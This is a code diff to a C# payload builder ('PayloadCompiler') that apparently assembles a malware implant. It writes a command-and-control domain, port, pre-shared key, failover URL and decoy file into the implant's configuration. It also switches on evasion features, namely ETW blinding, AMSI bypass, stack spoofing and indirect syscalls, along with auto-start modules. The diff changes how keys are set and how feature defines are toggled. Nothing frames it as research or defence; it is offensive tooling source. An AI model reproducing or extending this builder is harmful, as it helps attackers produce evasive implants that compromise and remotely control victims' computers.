@@ -16,7 +16,6 @@ namespace Builder_GUI
         private string _decoyFile;
         private string _c2Domain;
         private string _c2Port;
-        private string _c2Seed;
         private string[] _selectedAtoms;
         private string _autoStartOrder;
         private string _failoverUrl;
@@ -39,14 +38,16 @@ namespace Builder_GUI
         private bool _enableCleanup;
         private bool _enableBloat;
         private bool _enableSpoof;
+        private string _customPskId;
 
         public PayloadCompiler(string sourceDir = "..", string outputDir = ".\\Output", string decoyFile = "", 
-                               string c2Domain = "127.0.0.1", string c2Port = "6969", string c2Seed = "SuperSecretSeedForClient001", 
+                               string c2Domain = "127.0.0.1", string c2Port = "6969", 
                                string[]? selectedAtoms = null, string autoStartOrder = "4, 12, 1", string failoverUrl = "",
                                bool enableEtw = true, bool enableAmsi = true, bool enableStack = true,
                                bool enablePayload = true, bool enableIndirect = true,
                                bool enableIpc = true, bool enableProxy = true, bool enableManager = true,
-                               bool enableVeh = true, bool enableCleanup = true, bool enableBloat = false, bool enableSpoof = false)
+                               bool enableVeh = true, bool enableCleanup = true, bool enableBloat = false, bool enableSpoof = false,
+                               string customPskId = "")
         {
             _sourceDir = Path.GetFullPath(sourceDir);
             _outputDir = Path.GetFullPath(outputDir);
@@ -54,7 +55,6 @@ namespace Builder_GUI
             DecoyPath = _decoyFile;
             _c2Domain = c2Domain.Replace("http://", "").Replace("https://", "").TrimEnd('/');
             _c2Port = c2Port;
-            _c2Seed = c2Seed;
             _selectedAtoms = selectedAtoms ?? new string[] { "1", "4", "6", "12", "14" };
             _autoStartOrder = autoStartOrder;
             _failoverUrl = failoverUrl;
@@ -70,6 +70,7 @@ namespace Builder_GUI
             _enableCleanup = enableCleanup;
             _enableBloat = enableBloat;
             _enableSpoof = enableSpoof;
+            _customPskId = customPskId;
         }
 
         public bool BuildPayload()
@@ -79,7 +80,7 @@ namespace Builder_GUI
             Log($"[*] C2 Target: {_c2Domain}:{_c2Port}");
 
             // Generate building-specific cryptographic keys
-            string sessionKey = GenerateRandomString(16);
+            string sessionKey = string.IsNullOrEmpty(_customPskId) ? GenerateRandomString(16) : _customPskId;
             string xorKey = GenerateRandomString(12);
             string payloadXorKey = GenerateRandomString(16);
 
@@ -90,44 +91,37 @@ namespace Builder_GUI
             string batPath = "";
             try {
                 // 2. Perform dynamic configuration injection into Config.h
-                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* C2_DOMAIN\s*=\s*""([^""]+)""", $@"static const char* C2_DOMAIN  = ""{_c2Domain}""");
-                RegexReplaceInFile("Orchestrator\\Config.h", @"static const int\s*PUBLIC_PORT\s*=\s*(\d+)", $@"static const int   PUBLIC_PORT = {_c2Port}");
-                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* PSK_SEED\s*=\s*""([^""]+)""", $@"static const char* PSK_SEED   = ""{_c2Seed}""");
-                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\* PSK_ID\s*=\s*""([^""]+)""", $@"static const char* PSK_ID     = ""{sessionKey}""");
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\s*\*?\s*C2_DOMAIN\s*=\s*""([^""]+)""", $@"static const char *C2_DOMAIN = ""{_c2Domain}""");
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const int\s*PUBLIC_PORT\s*=\s*(\d+)", $@"static const int PUBLIC_PORT = {_c2Port}");
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\s*\*?\s*PSK_ID\s*=\s*""([^""]+)""", $@"static const char *PSK_ID = ""{sessionKey}""");
                 
                 // Dynamically inject the user's custom auto-start sequence
                 string autoStartSequence = string.IsNullOrEmpty(_autoStartOrder) ? "0" : _autoStartOrder;
-                RegexReplaceInFile("Orchestrator\\Config.h", @"static const DWORD AUTO_START_ATOMS\[\]\s*=\s*\{[^}]*\};", $@"static const DWORD AUTO_START_ATOMS[] = {{{autoStartSequence}}};");
+                RegexReplaceInFile("Orchestrator\\Config.h", @"static const DWORD\s+AUTO_START_ATOMS\[\]\s*=\s*\{[^}]*\};", $@"static const DWORD AUTO_START_ATOMS[] = {{{autoStartSequence}}};");
 
 
 
                 // Inject failover URL if provided
                 if (!string.IsNullOrEmpty(_failoverUrl)) {
-                    RegexReplaceInFile("Orchestrator\\Config.h", @"static const char \*FAILOVER_URL\s*=\s*""([^""]+)""", $@"static const char *FAILOVER_URL = ""{_failoverUrl}""");
+                    RegexReplaceInFile("Orchestrator\\Config.h", @"static const char\s*\*?\s*FAILOVER_URL\s*=\s*""([^""]+)""", $@"static const char *FAILOVER_URL = ""{_failoverUrl}""");
                     Log($"[*] Failover URL: {_failoverUrl}");
                 }
 
-                // Inject preprocessor macros to enable the selected atoms so unselected ones are completely excluded.
-                string configPath = Path.Combine(_sourceDir, "Orchestrator\\Config.h");
-                string configContent = File.ReadAllText(configPath);
-                configContent = System.Text.RegularExpressions.Regex.Replace(configContent, @"#define ATOM_\d+_ENABLED\r?\n", "");
-                configContent = System.Text.RegularExpressions.Regex.Replace(configContent, @"#define FEATURE_\w+_ENABLED\r?\n", "");
-                
-                StringBuilder defines = new StringBuilder();
-                foreach(string atomId in _selectedAtoms) {
-                    defines.AppendLine($"#define ATOM_{atomId}_ENABLED");
+                // Inject preprocessor macros to enable/disable components surgically
+                for (int i = 1; i <= 20; i++) {
+                    string atomDefine = $"ATOM_{i}_ENABLED";
+                    bool isSelected = _selectedAtoms.Contains(i.ToString());
+                    ToggleDefineInFile("Orchestrator\\Config.h", atomDefine, isSelected);
                 }
-                
-                if (_enableEtw) defines.AppendLine("#define FEATURE_ETW_BLIND_ENABLED");
-                if (_enableAmsi) defines.AppendLine("#define FEATURE_AMSI_BYPASS_ENABLED");
-                if (_enableStack) defines.AppendLine("#define FEATURE_STACK_SPOOF_ENABLED");
-                if (_enableIndirect) defines.AppendLine("#define FEATURE_INDIRECT_SYSCALLS_ENABLED");
-                if (_enableIpc) defines.AppendLine("#define FEATURE_IPC_CHANNEL_ENABLED");
-                if (_enableProxy) defines.AppendLine("#define FEATURE_PROXY_LOGIC_ENABLED");
-                if (_enableManager) defines.AppendLine("#define FEATURE_ATOM_MANAGER_ENABLED");
-                if (_enableVeh) defines.AppendLine("#define FEATURE_VEH_HANDLER_ENABLED");
 
-                File.WriteAllText(configPath, configContent + "\r\n" + defines.ToString());
+                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_ETW_BLIND_ENABLED", _enableEtw);
+                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_AMSI_BYPASS_ENABLED", _enableAmsi);
+                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_STACK_SPOOF_ENABLED", _enableStack);
+                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_INDIRECT_SYSCALLS_ENABLED", _enableIndirect);
+                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_IPC_CHANNEL_ENABLED", _enableIpc);
+                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_PROXY_LOGIC_ENABLED", _enableProxy);
+                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_ATOM_MANAGER_ENABLED", _enableManager);
+                ToggleDefineInFile("Orchestrator\\Config.h", "FEATURE_VEH_HANDLER_ENABLED", _enableVeh);
 
                 // Update the boolean constants in Config.h as well for runtime checks
                 RegexReplaceInFile("Orchestrator\\Config.h", @"static const bool ENABLE_ETW_BLIND\s*=\s*\w+;", $@"static const bool ENABLE_ETW_BLIND = {(_enableEtw ? "true" : "false")};");
@@ -331,6 +325,29 @@ namespace Builder_GUI
             {
                 File.WriteAllText(fullPath, newContent, Encoding.UTF8);
             }
+        }
+
+        private void ToggleDefineInFile(string relativePath, string define, bool enable)
+        {
+            string fullPath = Path.Combine(_sourceDir, relativePath);
+            if (!File.Exists(fullPath)) return;
+
+            string content = File.ReadAllText(fullPath);
+            
+            // Pattern to find either commented or uncommented define. 
+            // Handles "// #define", "//#define", "#define", etc.
+            string pattern = @"(?m)^(/+[\t ]*)?#define[\t ]+" + define + @".*$";
+            
+            string replacement = enable ? $"#define {define}" : $"// #define {define}";
+
+            if (System.Text.RegularExpressions.Regex.IsMatch(content, pattern)) {
+                content = System.Text.RegularExpressions.Regex.Replace(content, pattern, replacement);
+            } else if (enable) {
+                // If not found and we want to enable it, add it to the end of the file safely
+                content += "\r\n#define " + define;
+            }
+
+            File.WriteAllText(fullPath, content, Encoding.UTF8);
         }
 
         private void KillLockingProcesses()
